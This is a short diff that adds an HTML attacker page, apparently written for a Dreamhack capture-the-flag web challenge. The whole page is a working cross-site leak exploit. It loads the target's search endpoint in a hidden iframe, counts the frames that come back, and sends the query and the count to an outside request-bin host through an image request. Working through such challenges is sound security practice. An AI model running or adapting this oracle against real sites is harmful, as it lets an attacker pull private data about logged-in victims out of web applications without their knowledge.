@@ -1,1 +1,23 @@
-hello world
+<h2>Hello world</h2>
+<iframe id="iframe"></iframe>
+<img id="img" />
+<script>
+  const current_url = new URL(location.href);
+  const params = current_url.searchParams;
+//   const url = params.get('url');
+  const url = 'http://host3.dreamhack.games:21203/';
+  const query = params.get('query');
+//   const requestbin = params.get('requestbin');
+  const requestbin = 'https://dpfkvvd.request.dreamhack.games';
+
+  console.log('url', url);
+  console.log('query', query);
+  console.log('requestbin', requestbin);
+
+  const elem_iframe = document.getElementById("iframe");
+  const elem_img = document.getElementById("img");
+  elem_iframe.src = url + '/search?query=' + query;
+  elem_iframe.onload = () => {
+    elem_img.src = `${requestbin}/${query}/${elem_iframe.contentWindow.frames.length}`;
+  };
+</script>
